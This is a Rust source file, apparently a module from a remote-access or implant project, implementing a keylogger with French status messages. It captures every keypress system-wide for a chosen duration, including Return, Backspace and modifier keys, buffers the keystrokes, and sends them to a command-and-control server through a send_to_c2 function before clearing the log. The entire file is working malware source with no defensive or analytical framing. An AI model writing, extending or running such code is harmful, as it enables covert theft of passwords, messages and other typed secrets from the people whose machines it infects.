use crate::connexion::send_to_c2;
use lazy_static::lazy_static;
use rdev::{Event, EventType, Key};
use std::sync::{Arc, Mutex};
use tokio::time::{sleep, Duration};

lazy_static! {
    static ref KEY_LOGS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
}

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        if let Some(key_char) = key_to_string(key) {
            let mut data = KEY_LOGS.lock().unwrap();
            data.push(key_char);
        }
    }
}

fn key_to_string(key: Key) -> Option<String> {
    let key_str = format!("{:?}", key);
    let cleaned_key = key_str
        .strip_prefix("Key")
        .or_else(|| key_str.strip_prefix("Num"))
        .or_else(|| key_str.strip_prefix("Kp"))
        .unwrap_or(&key_str)
        .to_string();

    Some(match key {
        Key::Return => "\n".to_string(),
        Key::Space => " ".to_string(),
        Key::Backspace => "[BACK]".to_string(),
        Key::Escape => "[ESC]".to_string(),
        Key::ControlLeft | Key::ControlRight => "[CTRL]".to_string(),
        Key::ShiftLeft | Key::ShiftRight => "[SHIFT]".to_string(),
        Key::Alt => "[ALT]".to_string(),
        Key::Tab => "[TAB]".to_string(),
        Key::Dot => ".".to_string(),
        Key::SemiColon => ";".to_string(),
        _ => cleaned_key,
    })
}

pub async fn start_keylogger(duration_sec: u64) {
    tokio::task::spawn_blocking(|| {
        if let Err(error) = rdev::listen(callback) {
            println!(
                "Erreur lors de l'écoute des événements clavier : {:?}",
                error
            );
        }
    });

    sleep(Duration::from_secs(duration_sec)).await;

    let log_data = {
        let logs = KEY_LOGS.lock().unwrap();
        logs.join("")
    };

    match send_to_c2(log_data.into_bytes()).await {
        Ok(_) => println!("Logs envoyés"),
        Err(e) => eprintln!("Erreur lors de l'envoi : {}", e),
    }

    let mut logs = KEY_LOGS.lock().unwrap();
    logs.clear();
}
